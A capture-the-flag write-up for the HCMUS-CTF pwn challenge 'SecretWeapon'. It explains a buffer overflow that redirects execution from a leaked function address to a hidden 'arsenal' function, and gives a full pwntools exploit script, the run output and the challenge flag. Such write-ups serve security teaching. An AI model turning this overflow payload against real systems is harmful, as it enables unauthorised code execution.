## ⚡ [SecretWeapon](https://ctf.hcmus.edu.vn/challenges#SecretWeapon-16)

[![df](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)](https://img.shields.io/badge/B3T4-shark-brightgreen.svg)
[![df](https://img.shields.io/badge/member-viplazy-brightgreen.svg)](https://img.shields.io/badge/member-viplazy-brightgreen.svg)
[![df](https://img.shields.io/badge/57-pts-brightgreen.svg)](https://img.shields.io/badge/57-pts-brightgreen.svg)

Tác giả: `pakkunandy`

Tags: `pwn` `bof` `offset`

### Challenge Description
I will make you learn something about soccer. Follow my lead.

### Summary

Đây là challenge về buffer overflow để đến được với hàm cần gọi.

Chạy thử chương trình:

```bash
$ ./weapon
You wanna open the arsenal. Tell me the passphrase!
Your current location is townsquare with the address 0x43c2ff
...
```

Chương trình in ra địa chỉ của hàm `townsquare`, và gợi ý ta mở hàm `arsenal`.

Mỗi lần chạy thì địa chỉ trên cũng thay đổi, vậy ta phải xác định địa chỉ của `arsenal` dựa vào offset:

```bash 
$ objdump -t weapon | grep townsquare
000012ff g     F .text  0000005d              townsquare
$ objdump -t weapon | grep arsenal
000012d6 g     F .text  00000029              arsenal
```

`offset = 0x12ff - 0x12d6 = 0x29`

## Code

```python
#!/usr/bin/env python3

from pwn import *

offset = 0x29 # offset of two func

r = remote("61.28.237.24", 30201)
s = r.recvuntil('the address ')

dt = r.recvline()
townsquare_addr = int(dt[0:-2], base=16) # get townsquare_addr

arsenal_addr = townsquare_addr - offset # calc arsenal_addr

print(hex(townsquare_addr), hex(arsenal_addr))

payload = b'A'*28 + p32(arsenal_addr)

r.sendline(payload)

r.sendline(b'cat flag.txt;echo;exit')
r.interactive()

```

📫 Flag: **`HCMUS-CTF{you_know_how_to_compute_location}`**

---
*[Back to table of contents](../README.md)*
